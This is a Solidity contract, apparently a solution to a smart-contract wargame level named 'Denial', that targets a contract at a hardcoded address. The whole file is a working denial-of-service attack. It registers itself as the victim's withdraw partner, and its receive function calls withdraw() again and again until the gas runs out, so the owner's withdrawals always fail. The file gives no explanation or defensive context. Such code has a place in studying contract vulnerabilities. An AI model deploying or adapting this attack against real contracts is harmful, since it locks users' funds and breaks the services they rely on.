pragma solidity ^0.6.0;

interface IDenial {
    function setWithdrawPartner(address _partner) external ;
    function withdraw() external; 
}

contract AttackDenial {
    IDenial level; 
    constructor() public {
        level = IDenial(0x5552eB57FeE476B96e6118aA74458C2FccFDb7dd);
    }

    function attack() public {
        level.setWithdrawPartner(address(this));
    }

    receive() external payable {
        level.withdraw();
    }
}